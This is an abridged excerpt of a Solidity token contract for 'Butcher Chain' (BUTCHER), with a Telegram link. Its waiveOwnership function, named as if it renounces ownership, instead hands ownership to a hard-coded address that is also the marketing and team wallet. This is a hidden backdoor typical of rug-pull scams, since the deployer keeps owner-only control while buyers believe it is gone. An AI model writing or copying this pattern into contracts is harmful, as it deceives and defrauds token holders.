...
/**
Telegram : https://t.me/ButcherChain
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x44C8b09e2Fb92A3695647ba292d9cA1d1A60f366);
    }
...
contract ButcherChain is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Butcher Chain";
    string private _symbol = "BUTCHER";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x44C8b09e2Fb92A3695647ba292d9cA1d1A60f366);
    address payable private teamWalletAddress = payable(0x44C8b09e2Fb92A3695647ba292d9cA1d1A60f366);
